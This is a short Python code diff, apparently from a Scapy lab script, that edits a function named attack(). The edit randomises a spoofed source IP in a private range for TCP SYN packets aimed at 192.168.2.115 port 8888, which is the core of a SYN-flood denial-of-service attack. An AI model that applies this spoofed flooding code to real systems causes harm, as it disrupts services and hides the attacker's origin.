@@ -21,7 +21,9 @@ def print_number():
 def attack():
     print_number()
 
-    iplayer = IP(dst="192.168.2.115", src="192.168.2.50")
+    src_ip = "192.168.2." + str(random.randint(40, 50))
+
+    iplayer = IP(dst="192.168.2.115", src=src_ip)
     tcplayer = TCP(sport=RandShort(), dport=[
                    8888], seq=RandShort(), ack=1000, window=1000, flags="S")
 
